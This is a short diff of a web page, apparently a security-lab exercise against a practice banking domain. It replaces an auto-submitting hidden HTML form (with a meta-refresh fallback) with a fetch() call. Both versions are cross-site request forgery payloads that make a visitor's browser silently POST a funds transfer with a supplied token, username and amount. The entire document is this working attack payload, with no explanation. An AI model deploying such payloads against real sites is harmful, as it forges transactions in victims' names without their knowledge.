@@ -1,21 +1,9 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Loading…</title>
-</head>
-<body>
-  <form id="xfer" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
-    <input type="hidden" name="csrf_token" value="Mzc4NQ3D3A==">
-    <input type="hidden" name="username"    value="z5463756">
-    <input type="hidden" name="amount"      value="66">
-  </form>
-  <script>
-    document.getElementById('xfer').submit();
-  </script>
-  <noscript>
-    <meta http-equiv="refresh"
-          content="0;url=https://phish-me.quoccacorp.com/api/transfer?csrf_token=Mzc2NQ==&username=z5463756&amount=66">
-  </noscript>
-</body>
-</html>
+<script>
+fetch("https://phish-me.quoccacorp.com/api/transfer", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: new URLSearchParams({ csrf_token: "Mzc4NQ3D3A==", username: "z5463756", amount: "66" }),
+});
+</script>
